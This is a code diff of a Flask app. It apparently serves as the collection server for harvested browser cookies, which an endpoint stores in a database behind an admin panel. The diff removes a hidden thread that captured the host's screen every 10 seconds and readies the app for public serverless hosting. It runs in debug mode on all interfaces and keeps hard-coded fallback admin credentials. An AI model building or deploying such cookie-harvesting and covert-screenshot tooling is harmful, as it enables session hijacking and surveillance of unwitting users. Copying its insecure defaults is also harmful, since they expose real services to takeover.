@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template_string, redirect, url_for, session, send_from_directory
+from flask import Flask, request, render_template_string, redirect, url_for, session, send_from_directory, jsonify
 import http.cookies
 import json
 import os
@@ -15,13 +15,12 @@ except ImportError:
 
 # Flask app setup
 app = Flask(__name__)
-app.secret_key = 'your-secret-key-here'  # Change this in production
+app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-here')
 
-# Import functionality from lodder.py
 # Database setup
 DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'admin.db')
-ADMIN_USER = 'admin'
-ADMIN_PASS = 'securepassword'
+ADMIN_USER = os.environ.get('ADMIN_USER', 'admin')
+ADMIN_PASS = os.environ.get('ADMIN_PASS', 'securepassword')
 
 # Create tables if they don't exist
 def init_db():
@@ -336,59 +335,23 @@ def api_scrape():
         conn = sqlite3.connect(DB_FILE)
         cursor = conn.cursor()
         cursor.execute('INSERT INTO cookies (url, cookies) VALUES (?, ?)', 
-                      ('http://localhost:5000', json.dumps(cookies)))
+                      (request.host_url, json.dumps(cookies)))
         conn.commit()
         conn.close()
         
         print(f"Saved {len(cookies)} cookies to database")
-        return {'status': 'success'}
+        return jsonify({'status': 'success'})
     except Exception as e:
         print(f"Error processing POST: {e}")
-        return {'status': 'error'}, 400
+        return jsonify({'status': 'error'}), 400
 
 @app.route('/screenshots/<filename>')
 def serve_screenshot(filename):
     return send_from_directory(screenshot_dir, filename)
 
-def take_screenshots():
-    while not stop_screenshot_event.is_set():
-        if ImageGrab:
-            try:
-                # Take screenshot
-                screenshot = ImageGrab.grab()
-                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                filename = f"screenshot_{timestamp}.png"
-                filepath = os.path.join(screenshot_dir, filename)
-                
-                # Save screenshot
-                screenshot.save(filepath)
-                print(f"Screenshot saved: {filename}")
-            except Exception as e:
-                print(f"Error taking screenshot: {e}")
-        else:
-            print("PIL not installed, install with 'pip install Pillow'")
-            break
-        
-        # Wait 10 seconds before next screenshot
-        stop_screenshot_event.wait(timeout=10)
-
-def start_screenshot_thread():
-    global screenshot_thread
-    screenshot_thread = threading.Thread(target=take_screenshots, daemon=True)
-    screenshot_thread.start()
+# Vercel serverless function handler
+def handler(event, context):
+    return app(event, context)
 
 if __name__ == '__main__':
-    print(f"Flask app running on http://localhost:5000")
-    print(f"Database: {DB_FILE}")
-    print(f"Screenshots will be saved to: {screenshot_dir}")
-    
-    # Start screenshot thread
-    start_screenshot_thread()
-    
-    try:
-        app.run(host='localhost', port=5000, debug=False)
-    except KeyboardInterrupt:
-        print("\nShutting down server...")
-        stop_screenshot_event.set()
-        if screenshot_thread:
-            screenshot_thread.join(timeout=1)
+    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 8000)))
